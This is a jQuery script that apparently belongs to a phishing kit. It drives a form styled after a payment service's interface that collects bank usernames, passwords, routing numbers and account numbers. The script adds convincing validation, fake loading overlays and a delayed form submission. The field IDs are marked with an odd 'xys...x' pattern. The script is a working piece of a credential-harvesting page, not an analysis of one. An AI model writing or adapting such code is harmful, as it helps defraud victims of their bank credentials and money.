$(document).ready(function(){
    $('.xysnewLoaderx').fadeOut(0);
    $('.busyOverlay').fadeIn();
    setTimeout(function(){
        $('.busyOverlay').fadeOut();
        $('.xysnewLoaderx').fadeIn();
    }, 3000);

    //popUpLang
    $('#xyspopUpLangx').click(function(){
        $('.modalWindow').removeClass('hide');
        setTimeout(function(){ 
            $('.modalWindow').addClass('xysShowPopUpLangx');
        }, 2);
    });
    $('#xysclosePopUpLangx').click(function(){
        $('.modalWindow').removeClass('xysShowPopUpLangx');
        setTimeout(function(){ 
            $('.modalWindow').addClass('hide');
        }, 1000);
    });
    
    $('#xysuserbankx, #xyspaswdbankx').focus(function(){
    	$(this).parent().parent().parent().addClass('hasFocus');
    	if($(this).parent().parent().parent().hasClass('vx_has-error-with-message')){
    		$(this).parent().parent().next('span').removeClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
    		$(this).parent().parent().next('span').addClass('vx_form-control-message');
    		$(this).parent().parent().next('span').children().removeClass('hide');
    	}
    });
    $('#xysuserbankx, #xyspaswdbankx').blur(function(){
    	$(this).parent().parent().parent().removeClass('hasFocus');
    	if($(this).val().length <= 0){
    		$(this).parent().parent().next('span').removeClass('vx_form-control-message');
    		$(this).parent().parent().next('span').children().addClass('hide');
    		$(this).parent().parent().parent().addClass('vx_has-error-with-message');
    		$(this).parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
    		$(this).parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
    	}
    	else
    	{
    		$(this).parent().parent().next('span').removeClass('vx_form-control-message');
    		$(this).parent().parent().next('span').children().addClass('hide');
    		$(this).parent().parent().parent().removeClass('vx_has-error-with-message');
    		$(this).parent().parent().next('span').fadeOut(0);
    		$(this).parent().parent().next('span').addClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
    		$(this).parent().parent().next('span').fadeIn();
    	}
    });
    $('#xysuserbankx, #xyspaswdbankx').keyup(function(){
    	if($(this).val().length > 0){
    		$(this).parent().parent().parent().addClass('hasValue');
    	}
    	else
    	{
    		$(this).parent().parent().parent().removeClass('hasValue');
    	}
    });
    $('#xysroutingnumberx, #xysaccnumberx').focus(function(){
    	$(this).parent().parent().parent().addClass('hasFocus');
    });
    $('#xysroutingnumberx, #xysaccnumberx').blur(function(){
    	$(this).parent().parent().parent().removeClass('hasFocus');
    	if($(this).val().length > 0){
    		$(this).parent().parent().parent().addClass('hasValue');
    	}
    	else
    	{
    		$(this).parent().parent().parent().removeClass('hasValue');
    	}
    });
    $('#xysbtnConfirmx').click(function(event){
        event.preventDefault();
        if($('#xysuserbankx').val().length <= 0){
            $('#xysuserbankx').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xysuserbankx').parent().parent().next('span').children().addClass('hide');
            $('#xysuserbankx').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xysuserbankx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xysuserbankx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if($('#xyspaswdbankx').val().length <= 3){
            $('#xyspaswdbankx').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xyspaswdbankx').parent().parent().next('span').children().addClass('hide');
            $('#xyspaswdbankx').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xyspaswdbankx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xyspaswdbankx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else {
            $('.busyOverlay').fadeIn();
            setTimeout(function(){
                $("form").submit();
                $("form").bind("ajaxStop", function(){
                    $('.busyOverlay').fadeOut();
                });
            }, 2500);
        }
    });
});